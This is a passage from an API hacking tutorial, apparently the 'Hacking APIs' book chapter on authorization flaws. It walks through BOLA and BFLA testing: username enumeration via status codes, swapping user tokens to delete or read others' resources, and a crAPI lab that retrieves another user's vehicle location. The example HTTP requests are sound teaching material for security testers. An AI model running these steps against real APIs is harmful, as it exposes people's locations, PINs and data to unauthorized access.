href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23table10-2&amp;sa=D&amp;source=editors&amp;ust=1681144486703715&amp;usg=AOvVaw1ktGffR5HOfuNpvm4hIq-c">Table 10-2</a></span><span class="c1 c13">&nbsp;gives a few examples of requests and responses that could be useful for side-channel BOLA disclosures. If 404 Not Found is a standard response for nonexistent resources, the other status codes could be used to enumerate usernames, user ID numbers, and phone numbers. These requests provide just a few examples of information that could be gathered when the API has different responses for nonexistent resources and existing resources that you are not authorized to view. If these requests successful, they can result in a serious disclosure of sensitive data.</span></p><p class="c22"><span class="c0">Table 10-2</span><span class="c34 c15 c11 c33">: Examples of Side-Channel BOLA Disclosures</span></p><a id="t.bb5512cda317b9f878399b14cdd997e2bb753172"></a><a id="t.1"></a><table class="c31"><tr class="c42"><td class="c53" colspan="1" rowspan="1"><p class="c18"><span class="c40 c33">Request</span></p></td><td class="c54" colspan="1" rowspan="1"><p class="c18"><span class="c33 c40">Response</span></p></td></tr><tr class="c43"><td class="c12" colspan="1" rowspan="1"><p class="c18"><span class="c5">GET /api/user/test987123</span></p></td><td class="c41" colspan="1" rowspan="1"><p class="c18"><span class="c5">404 Not Found HTTP/1.1</span></p></td></tr><tr class="c49"><td class="c12" colspan="1" rowspan="1"><p class="c18"><span class="c20">GET /api/user/hapihacker</span></p></td><td class="c41" colspan="1" rowspan="1"><p class="c18"><span class="c4">405 Unauthorized HTTP/1.1</span></p><p class="c18"><span class="c4">{</span></p><p class="c18"><span class="c20">}</span></p></td></tr><tr class="c49"><td class="c12" colspan="1" rowspan="1"><p class="c18"><span class="c5">GET /api/user/1337</span></p></td><td class="c41" colspan="1" rowspan="1"><p class="c18"><span class="c5 c13">405 Unauthorized HTTP/1.1</span></p><p class="c18"><span class="c5 c13">{</span></p><p class="c18"><span class="c5">}</span></p></td></tr><tr class="c49"><td class="c12" colspan="1" rowspan="1"><p class="c18"><span class="c20">GET /api/user/phone/2018675309</span></p></td><td class="c41" colspan="1" rowspan="1"><p class="c18"><span class="c4">405 Unauthorized HTTP/1.1</span></p><p class="c18"><span class="c4">{</span></p><p class="c18"><span class="c20">}</span></p></td></tr></table><p class="c3 c16"><span class="c1">On its own, this BOLA finding may seem minimal, but information like this can prove to be valuable in other attacks. For example, you could leverage information gathered through a side-channel disclosure to perform brute-force attacks to gain entry to valid accounts. You could also use information gathered in a disclosure like this to perform other BOLA tests, such as the ID combo BOLA test shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23table10-1&amp;sa=D&amp;source=editors&amp;ust=1681144486708309&amp;usg=AOvVaw2Ne5qB06GCR0P4y9t2qr2p">Table 10-1</a></span><span class="c1 c13">.</span></p><h2 class="c32 c33" id="h.f4mmwjmk5aiv"><span class="c13 c35">Finding BFLAs</span></h2><p class="c3"><span class="c1 c13">Hunting for BFLA involves searching for functionality to which you should not have access. A BFLA vulnerability might allow you to update object values, delete data, and perform actions as other users. To check for it, try to alter or delete resources or gain access to functionality that belongs to another user or privilege level.</span></p><p class="c3 c16"><span class="c1 c13">Note that if you successfully send a DELETE request, you&rsquo;ll no longer have access to the given resource . . . because you&rsquo;ll have deleted it. For that reason, avoid testing for DELETE while fuzzing, unless you&rsquo;re targeting a test environment. Imagine that you send DELETE requests to 1,000 resource identifiers; if the requests succeed, you&rsquo;ll have deleted potentially valuable information, and your client won&rsquo;t be happy. Instead, start your BFLA testing on a small scale to avoid causing huge interruptions.</span></p><h3 class="c32 c33" id="h.v449vcpa7zp8"><span class="c37 c13">A-B-A Testing for BFLA</span></h3><p class="c3"><span class="c1 c13">Like A-B testing for BOLA, A-B-A testing is the process of creating and accessing resources with one account and then attempting to alter the resources with another account. Finally, you should validate any changes with the original account. The A-B-A process should look something like this:</span></p><ul class="c38 lst-kix_w40x35iv99nl-0 start"><li class="c36 c33 li-bullet-0"><span class="c21">Create, read, update, or delete resources as UserA.</span><span class="c1 c13">&nbsp;Note how the resources are identified and how the resources are requested.</span></li><li class="c36 c33 li-bullet-0"><span class="c21">Swap out your UserA token for UserB&rsquo;s. </span><span class="c1 c13">In instances where there is an account registration process, create a second test account.</span></li><li class="c36 c33 li-bullet-0"><span class="c21">Send GET, PUT, POST, and DELETE requests for UserA&rsquo;s resources using UserB&rsquo;s token.</span><span class="c1 c13">&nbsp;If possible, alter resources by updating the properties of an object.</span></li><li class="c36 c33 li-bullet-0"><span class="c21">Check UserA&rsquo;s resources to validate changes have been made by using UserB&rsquo;s token.</span><span class="c1 c13">&nbsp;Either by using the corresponding web application or by making API requests using UserA&rsquo;s token, check the relevant resources. If, for example, the BFLA attack was an attempt to delete UserA&rsquo;s profile picture, load UserA&rsquo;s profile to see if the picture is missing.</span></li></ul><p class="c3 c16"><span class="c1 c13">In addition to testing authorization weaknesses at a single privilege level, ensure that you check for weaknesses at other privilege levels. As previously discussed, APIs could have all sorts of different privilege levels, such as basic user, merchant, partner, and admin. If you have access to accounts at the various privilege levels, your A-B-A testing can take on a new layer. Try making UserA an administrator and UserB a basic user. If you&rsquo;re able to exploit BLFA in that situation, it will have become a privilege escalation attack.</span></p><h3 class="c32 c33" id="h.dwxdjihf9xwi"><span class="c37 c13">Testing for BFLA in Postman</span></h3><p class="c3"><span class="c1">Begin your BFLA testing with authorized requests for UserA&rsquo;s resources. If you were testing whether you could modify another user&rsquo;s pictures in a social media app, a simple request like the one shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-1&amp;sa=D&amp;source=editors&amp;ust=1681144486710371&amp;usg=AOvVaw10rHNXljdc9EyOHro5RT8k">Listing 10-1</a></span><span class="c1 c13">&nbsp;would do:</span></p><p class="c19"><span class="c6">GET /api/picture/2</span></p><p class="c30"><span class="c6">Token: UserA_token</span></p><p class="c3"><span class="c7">Listing 10-1</span><span class="c1 c15 c11">: Sample request for BFLA testing</span></p><p class="c3 c16"><span class="c1">This request tells us that resources are identified by numeric values in the path. Moreover, the response, shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-2&amp;sa=D&amp;source=editors&amp;ust=1681144486711067&amp;usg=AOvVaw0CZd85FiNw3wOvfRuAMHFF">Listing 10-2</a></span><span class="c1">, indicates that the username of the resource (</span><span class="c5">&quot;UserA&quot;</span><span class="c1 c13">) matches the request token.</span></p><p class="c19"><span class="c6">200 OK</span></p><p class="c19"><span class="c6">{</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;_id&quot;: 2,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;name&quot;: &quot;development flower&quot;,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;creator_id&quot;: 2,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;username&quot;: &quot;UserA&quot;,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;money_made&quot;: 0.35,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &quot;likes&quot;: 0</span></p><p class="c30"><span class="c6">}</span></p><p class="c3"><span class="c7">Listing 10-2</span><span class="c1 c15 c11">: Sample response from a BFLA test</span></p><p class="c3 c16"><span class="c1 c13">Now, given that this is a social media platform where users can share pictures, it wouldn&rsquo;t be too surprising if another user had the ability to send a successful GET request for picture 2. This isn&rsquo;t an instance of BOLA but rather a feature. However, UserB shouldn&rsquo;t be able to delete pictures that belong to UserA. That is where we cross into a BFLA vulnerability.</span></p><p class="c3 c16"><span class="c1">In Postman, try sending a DELETE request for UserA&rsquo;s resource containing UserB&rsquo;s token. As you see in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-1&amp;sa=D&amp;source=editors&amp;ust=1681144486712315&amp;usg=AOvVaw1Kri09Quj2G6xiBHAz49n8">Figure 10-1</a></span><span class="c1">, a DELETE request using UserB&rsquo;s token was able to successfully delete UserA&rsquo;s picture. To validate that the picture was deleted, send a follow-up GET request for </span><span class="c5">picture_id=2</span><span class="c1 c13">, and you will confirm that UserA&rsquo;s picture with the ID of 2 no longer exists. This is a very important finding, since a single malicious user could easily delete all other users&rsquo; resources.</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 385.33px;"><img alt="screenshot of postman that shows photo 2 has been deleted successfully" src="images/image7.png" style="width: 624.00px; height: 385.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c29 c11">Figure 10-1</span><span class="c34 c15 c11 c33">: Successful BFLA attack with Postman</span></p><p class="c3 c16"><span class="c1 c13">You can simplify the process of finding privilege escalation&ndash;related BFLA vulnerabilities if you have access to documentation. Alternatively, you might find administrative actions clearly labeled in a collection, or you might have reverse engineered administrative functionality. If this isn&rsquo;t the case, you&rsquo;ll need to fuzz for admin paths.</span></p><p class="c3 c16"><span class="c1">One of the simplest ways to test for BFLA is to make administrative requests as a low-privileged user. If an API allows administrators to search for users with a POST request, try making that exact admin request to see if any security controls are in place to prevent you from succeeding. Look at the request in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-3&amp;sa=D&amp;source=editors&amp;ust=1681144486713193&amp;usg=AOvVaw3W4uLBsD8bSdJi5UKTU3cX">Listing 10-3</a></span><span class="c1">. In the response (</span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-4&amp;sa=D&amp;source=editors&amp;ust=1681144486713528&amp;usg=AOvVaw1MGqxZNc4ywGHXMIBsyucq">Listing 10-4</a></span><span class="c1 c13">), we see that the API did not have any such restrictions.</span></p><p class="c19"><span class="c6">POST /api/admin/find/user</span></p><p class="c19"><span class="c6">Token: LowPriv-Token</span></p><p class="c19 c24"><span class="c6"></span></p><p class="c19"><span class="c6">{&quot;email&quot;: &quot;hapi@hacker.com&quot;}</span></p><p class="c24 c30"><span class="c6"></span></p><p class="c3"><span class="c7">Listing 10-3</span><span class="c1 c15 c11">: Request for user information</span></p><p class="c19"><span class="c6">200 OK HTTP/1.1</span></p><p class="c19 c24"><span class="c6"></span></p><p class="c19"><span class="c6">{</span></p><p class="c19"><span class="c6">&quot;fname&quot;: &quot;hAPI&quot;,</span></p><p class="c19"><span class="c6">&quot;lname&quot;: &quot;Hacker&quot;,</span></p><p class="c19"><span class="c6">&quot;is_admin&quot;: false,</span></p><p class="c19"><span class="c6">&quot;balance&quot;: &quot;3737.50&quot;</span></p><p class="c19"><span class="c6">&quot;pin&quot;: 8675</span></p><p class="c30"><span class="c6">}</span></p><p class="c3"><span class="c7">Listing 10-4</span><span class="c1 c15 c11">: Response with user information</span></p><p class="c3 c16"><span class="c1">The ability to search for users and gain access to another user&rsquo;s sensitive information was meant to be restricted to only those with an administrative token. However, by making a request to the </span><span class="c1 c11">/admin/find/user</span><span class="c1 c13">&nbsp;endpoint, you can test to see if there is any technical enforcement. Since this is an administrative request, a successful response could also provide sensitive information, such as a user&rsquo;s full name, balance, and personal identification number (PIN).</span></p><p class="c3 c16"><span class="c1 c13">If restrictions are in place, try changing the request method. Use a POST request instead of a PUT request, or vice versa. Sometimes an API provider has secured one request method from unauthorized requests but has overlooked another.</span></p><h2 class="c32 c33" id="h.6wbnkbqe2odu"><span class="c35 c13">Authorization Hacking Tips</span></h2><p class="c3"><span class="c1 c13">Attacking a large-scale API with hundreds of endpoints and thousands of unique requests can be fairly time-consuming. The following tactics should help you test for authorization weaknesses across an entire API: using Collection variables in Postman and using the Burp Suite Match and Replace feature.</span></p><h3 class="c32 c33" id="h.vkbxau23ta4"><span class="c37 c13">Postman&rsquo;s Collection Variables</span></h3><p class="c3"><span class="c1 c13">As you would when fuzzing wide, you can use Postman to perform variable changes across a collection, setting the authorization token for your collection as a variable. Begin by testing various requests for your resources to make sure they work properly as UserA. Then replace the token variable with the UserB token. To help you find anomalous responses, use a Collection test to locate 200 response codes or the equivalent for your API.</span></p><p class="c3 c16"><span class="c1 c13">In Collection Runner, select only the requests that are likely to contain authorization vulnerabilities. Good candidate requests include those that contain private information belonging to UserA. Launch the Collection Runner and review the results. When checking results, look for instances in which the UserB token results in a successful response. These successful responses will likely indicate either BOLA or BFLA vulnerabilities and should be investigated further.</span></p><h3 class="c32 c33" id="h.rpoc0ed1l8tb"><span class="c37 c13">Burp Suite Match and Replace</span></h3><p class="c3"><span class="c1 c13">When you&rsquo;re attacking an API, your Burp Suite history will populate with unique requests. Instead of sifting through each request and testing it for authorization vulnerabilities, use the Match and Replace option to perform a large-scale replacement of a variable like an authorization token.</span></p><p class="c3 c16"><span class="c1">Begin by collecting several requests in your history as UserA, focusing on actions that should require authorization. For instance, focus on requests that involve a user&rsquo;s account and resources. Next, match and replace the authorization headers with UserB&rsquo;s and repeat the requests (see </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-2&amp;sa=D&amp;source=editors&amp;ust=1681144486716202&amp;usg=AOvVaw3VSnlDNnbyo52IJsJLX7TN">Figure 10-2</a></span><span class="c1 c13">).</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 405.33px;"><img alt="screenshot of burp suite&rsquo;s match and replace tool (found under proxy &gt; options) that shows tokena being replaced with tokenb" src="images/image1.png" style="width: 624.00px; height: 405.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c29 c11">Figure 10-2</span><span class="c34 c15 c11 c33">: Burp Suite&rsquo;s Match and Replace feature</span></p><p class="c3 c16"><span class="c1 c13">Once you find an instance of BOLA or BFLA, try to exploit it for all users and related resources.</span></p><h2 class="c32 c33" id="h.xeg1np15tzq0"><span class="c35 c13">Summary</span></h2><p class="c3"><span class="c1 c13">In this chapter, we took a close look at techniques for attacking common weaknesses in API authorization. Since each API is unique, it&rsquo;s important not only to figure out how resources are identified but also to make requests for resources that don&rsquo;t belong to the account you&rsquo;re using.</span></p><p class="c3 c16"><span class="c1 c13">Authorization can lead to some of the most severe consequences. A BOLA vulnerability could allow an attacker to compromise an organization&rsquo;s most sensitive information, whereas a BFLA vulnerability could allow you to escalate privileges or perform unauthorized actions that could compromise an API provider.</span></p><h2 class="c32 c33" id="h.x0656q4nifl3"><span class="c13 c51">Lab #7: Finding Another User&rsquo;s Vehicle Location</span></h2><p class="c3"><span class="c1 c13">In this lab, we&rsquo;ll search crAPI to discover the resource identifiers in use and test whether we can gain unauthorized access to another user&rsquo;s data. In doing so, we&rsquo;ll see the value of combining multiple vulnerabilities to increase the impact of an attack. If you&rsquo;ve followed along in the other labs, you should have a crAPI Postman collection containing all sorts of requests.</span></p><p class="c3 c16"><span class="c1 c13">You may notice that the use of resource IDs is fairly light. However, one request does include a unique resource identifier. The &ldquo;refresh location&rdquo; button at the bottom of the crAPI dashboard issues the following request:</span></p><p class="c30"><span class="c47">GET /identity/api/v2/vehicle/</span><span class="c9">fd5a4781-5cb5-42e2-8524-d3e67f5cb3a6</span><span class="c6">/location.</span></p><p class="c3 c16"><span class="c1 c13">This request takes the user&rsquo;s GUID and requests the current location of the user&rsquo;s vehicle. The location of another user&rsquo;s vehicle sounds like sensitive information worth collecting. We should see if the crAPI developers depend on the complexity of the GUID for authorization or if there are technical controls making sure users can only check the GUID of their own vehicle.</span></p><p class="c3 c16"><span class="c1">So the question is, how should you perform this test? You might want to put your fuzzing skills from Chapter 9 to use, but an alphanumeric GUID of this length would take an impossible amount of time to brute-force. Instead, you can obtain another existing GUID and use it to perform A-B testing. To do this, you will need to register for a second account, as shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-3&amp;sa=D&amp;source=editors&amp;ust=1681144486717961&amp;usg=AOvVaw0cT_gwoZrY4_Po62vvM3Qw">Figure 10-3</a></span><span class="c1 c13">.</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 582.67px; height: 550.67px;"><img alt="screenshot of crapi&rsquo;s new user sign-up window" src="images/image4.png" style="width: 582.67px; height: 550.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c29 c11">Figure 10-3</span><span class="c34 c15 c11 c33">: Registering UserB with crAPI</span></p><p class="c3 c16"><span class="c1">In </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-3&amp;sa=D&amp;source=editors&amp;ust=1681144486718559&amp;usg=AOvVaw12lhIT9TwNoQNHMvL5pifP">Figure 10-3</a></span><span class="c1 c13">, you can see that we&rsquo;ve created a second account, called UserB. With this account, go through the steps to register a vehicle using MailHog. As you may remember, back in the Chapter 6 lab we performed reconnaissance and discovered some other open ports associated with crAPI. One of these was port 8025, which is where MailHog is located.</span></p><p class="c3 c16"><span class="c1">As an authenticated user, click the </span><span class="c21">Click Here</span><span class="c1">&nbsp;link on the dashboard, as seen in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-4&amp;sa=D&amp;source=editors&amp;ust=1681144486719044&amp;usg=AOvVaw2q9JsgoYz7MaQj0ngGO1Tx">Figure 10-4</a></span><span class="c1 c13">. This will generate an email with your vehicle&rsquo;s information and send it to your MailHog account.</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 146.67px;"><img alt="screenshot of crapi&rsquo;s new user dashboard that states &ldquo;no vehicles found&rdquo; under vehicles details. within this message is a clickable button labeled &ldquo;click here.&rdquo;" src="images/image2.png" style="width: 624.00px; height: 146.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c11 c29">Figure 10-4</span><span class="c34 c15 c11 c33">: A crAPI new user dashboard</span></p><p class="c3 c16"><span class="c1">Update the URL in the address bar to visit port 8025 using the following format: </span><span class="c1 c11">http://yourIPaddress:8025</span><span class="c1">. Once in MailHog, open the &ldquo;Welcome to crAPI&rdquo; email (see </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-5&amp;sa=D&amp;source=editors&amp;ust=1681144486719733&amp;usg=AOvVaw3atkwGn9_Jk8kpe56fdsMo">Figure 10-5</a></span><span class="c1 c13">).</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 441.33px;"><img alt="screenshot of &ldquo;welcome to crapi&rdquo; email in mailhog that states your vehicle&rsquo;s vin and pincode" src="images/image6.png" style="width: 624.00px; height: 441.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c29 c11">Figure 10-5</span><span class="c15 c11 c33 c34">: The crAPI MailHog email service</span></p><p class="c3 c16"><span class="c1">Take the VIN and pincode information provided in the email and use that to register your vehicle back on the crAPI dashboard by clicking the </span><span class="c21">Add a Vehicle</span><span class="c1">&nbsp;button. This results in the window shown in </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23figure10-6&amp;sa=D&amp;source=editors&amp;ust=1681144486720414&amp;usg=AOvVaw0WLJVz3Y__yKUflfhdHstW">Figure 10-6</a></span><span class="c1 c13">.</span></p><p class="c27"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 553.33px; height: 394.67px;"><img alt="screenshot of crapi&rsquo;s add a vehicle window that has boxes to type in the vehicle&rsquo;s pin code and vin" src="images/image3.png" style="width: 553.33px; height: 394.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c22"><span class="c29 c11">Figure 10-6</span><span class="c34 c15 c11 c33">: The crAPI Vehicle Verification screen</span></p><p class="c3 c16"><span class="c1">Once you&rsquo;ve registered the UserB vehicle, capture a request using the </span><span class="c21">Refresh Location</span><span class="c1 c13">&nbsp;button. It should look like this:</span></p><p class="c19"><span class="c6">GET /identity/api/v2/vehicle/d3b4b4b8-6df6-4134-8d32-1be402caf45c/location HTTP/1.1</span></p><p class="c19"><span class="c6">Host: 192.168.195.130:8888</span></p><p class="c19"><span class="c6">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0</span></p><p class="c19"><span class="c6">Accept: */*</span></p><p class="c19"><span class="c6">Content-Type: application/json</span></p><p class="c19"><span class="c47">Authorization: Bearer </span><span class="c9">UserB-Token</span></p><p class="c30"><span class="c6">Content-Length: 376</span></p><p class="c3 c16"><span class="c1">Now that you have UserB&rsquo;s GUID, you can swap out the UserB Bearer token and send the request with UserA&rsquo;s bearer token. </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-5&amp;sa=D&amp;source=editors&amp;ust=1681144486721715&amp;usg=AOvVaw1p27HzuzALsEFAAH0QFDWA">Listing 10-5</a></span><span class="c1">&nbsp;shows the request, and </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-6&amp;sa=D&amp;source=editors&amp;ust=1681144486722005&amp;usg=AOvVaw2RuCmN62lbttWjywHy_jU2">Listing 10-6</a></span><span class="c1 c13">&nbsp;shows the response.</span></p><p class="c19"><span class="c6">GET /identity/api/v2/vehicle/d3b4b4b8-6df6-4134-8d32-1be402caf45c/location HTTP/1.1</span></p><p class="c19"><span class="c6">Host: 192.168.195.130:8888</span></p><p class="c19"><span class="c6">Content-Type: application/json</span></p><p class="c30"><span class="c47">Authorization: Bearer </span><span class="c9 c13">UserA-Token</span></p><p class="c3"><span class="c7">Listing 10-5</span><span class="c1 c15 c11">: A BOLA attempt</span></p><p class="c19"><span class="c6">HTTP/1.1 200</span></p><p class="c19 c24"><span class="c6"></span></p><p class="c19"><span class="c6">{</span></p><p class="c19"><span class="c6">&quot;carId&quot;:&quot;d3b4b4b8-6df6-4134-8d32-1be402caf45c&quot;,</span></p><p class="c19"><span class="c6">&quot;vehicleLocation&quot;:</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;{</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;id&quot;:2,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;latitude&quot;:&quot;39.0247621&quot;,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;longitude&quot;:&quot;-77.1402267&quot;</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;},</span></p><p class="c19"><span class="c47">&quot;fullName&quot;:&quot;</span><span class="c9">UserB</span><span class="c6">&quot;</span></p><p class="c30"><span class="c6">}</span></p><p class="c3"><span class="c7">Listing 10-6</span><span class="c1 c15 c11">: Response to the BOLA attempt</span></p><p class="c3 c16"><span class="c1">Congratulations, you&rsquo;ve discovered a BOLA vulnerability. Perhaps there is a way to discover the GUIDs of other valid users to take this finding to the next level. Well, remember that, in Chapter 7, an intercepted GET request to </span><span class="c1 c11">/community/api/v2/community/posts/recent</span><span class="c1 c13">&nbsp;resulted in an excessive data exposure. At first glance, this vulnerability did not seem to have severe consequences. However, we now have plenty of use for the exposed data. Take a look at the following object from that excessive data exposure:</span></p><p class="c19"><span class="c6">{</span></p><p class="c19"><span class="c6">&quot;id&quot;:&quot;sEcaWGHf5d63T2E7asChJc&quot;,</span></p><p class="c19"><span class="c6">&quot;title&quot;:&quot;Title 1&quot;,</span></p><p class="c19"><span class="c6">&quot;content&quot;:&quot;Hello world 1&quot;,</span></p><p class="c19"><span class="c6">&quot;author&quot;:{</span></p><p class="c19"><span class="c6">&quot;nickname&quot;:&quot;Adam&quot;,</span></p><p class="c19"><span class="c6">&quot;email&quot;:&quot;adam007@example.com&quot;,</span></p><p class="c19"><span class="c47">&quot;vehicleid&quot;:</span><span class="c9">&quot;2e88a86c-8b3b-4bd1-8117-85f3c8b52ed2&quot;,</span></p><p class="c19"><span class="c6">&quot;profile_pic_url&quot;:&quot;&quot;,</span></p><p class="c30"><span class="c6">}</span></p><p class="c3 c16"><span class="c1">This data reveals a </span><span class="c5">vehicleid</span><span class="c1">&nbsp;that closely resembles the GUID used in the Refresh Location request. Substitute these GUIDs using UserA&rsquo;s token. </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-7&amp;sa=D&amp;source=editors&amp;ust=1681144486724721&amp;usg=AOvVaw3e21ApQ6eV-xo9lWp_WclI">Listing 10-7</a></span><span class="c1">&nbsp;shows the request, and </span><span class="c7"><a class="c14" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c10.xhtml%23listing10-8&amp;sa=D&amp;source=editors&amp;ust=1681144486725013&amp;usg=AOvVaw2YY3R5F5aIXQuUFaEAN5U-">Listing 10-8</a></span><span class="c1 c13">&nbsp;shows the response.</span></p><p class="c19"><span class="c6">GET /identity/api/v2/vehicle/2e88a86c-8b3b-4bd1-8117-85f3c8b52ed2/location HTTP/1.1</span></p><p class="c19"><span class="c6">Host: 192.168.195.130:8888</span></p><p class="c19"><span class="c6">Content-Type: application/json</span></p><p class="c19"><span class="c47">Authorization: Bearer </span><span class="c9">UserA-Token</span></p><p class="c30"><span class="c6">Connection: close</span></p><p class="c3"><span class="c7">Listing 10-7</span><span class="c1 c11 c15">: A request for another user&rsquo;s GUID</span></p><p class="c19"><span class="c6">HTTP/1.1 200</span></p><p class="c19"><span class="c6">{</span></p><p class="c19"><span class="c6">&quot;carId&quot;:&quot;2e88a86c-8b3b-4bd1-8117-85f3c8b52ed2&quot;,</span></p><p class="c19"><span class="c6">&quot;vehicleLocation&quot;:{</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;id&quot;:7,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;latitude&quot;:&quot;37.233333&quot;,</span></p><p class="c19"><span class="c6">&nbsp; &nbsp; &nbsp;&quot;longitude&quot;:&quot;-115.808333&quot;},</span></p><p class="c19"><span class="c6">&quot;fullName&quot;:&quot;Adam&quot;</span></p><p class="c30"><span class="c6">}</span></p><p class="c3"><span class="c7">Listing 10-8</span><span class="c1 c15 c11">: The response</span></p><p class="c3 c16"><span class="c1 c13">Sure enough, you can exploit the BOLA vulnerability to discover the location of the user&rsquo;s vehicle. Now you&rsquo;re one Google Maps search away from discovering the user&rsquo;s exact location and gaining the ability to track any user&rsquo;s vehicle location over time. Combining vulnerability findings, as you do in this lab, will make you a master API hacker.</span></p><p class="c19 c24"><span class="c13 c55"></span></p></body></html>